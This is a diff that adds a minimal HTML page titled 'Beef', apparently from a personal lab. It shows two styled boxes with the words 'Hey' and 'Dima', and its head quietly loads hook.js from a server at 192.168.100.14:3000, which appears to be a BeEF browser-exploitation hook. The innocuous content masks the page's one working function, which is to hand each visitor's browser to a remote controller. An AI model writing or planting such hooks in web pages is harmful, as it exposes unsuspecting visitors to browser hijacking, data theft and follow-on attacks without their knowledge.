@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<title>Beef</title>
+	<style type="text/css">
+		#a{
+			background: #555;
+			height: 200px;
+			width: 200px;
+			color: orange;
+      border: solid 3px black;
+      border-radius: 20px;
+		}
+		#b{
+			background: #666;
+			height: 300px;
+			width: 300px;
+			border: solid 10px black;
+			color:  white;
+			position: absolute;
+			top: 300px;
+			left: 200px;
+			border-radius: 40px;
+		}
+		#b>#bb{
+			position: relative;
+			top: 100px;
+			left: 100px;
+		}
+		#a>#aa{
+			position: relative;
+			top: 100px;
+			left: 100px;
+		}
+	</style>
+	<script src="http://192.168.100.14:3000/hook.js"></script>
+</head>
+<body>
+	<div id="a"><p id="aa">Hey</p></div>
+	<div id="b"><p id="bb">Dima</p></div>
+</body>
+</html>
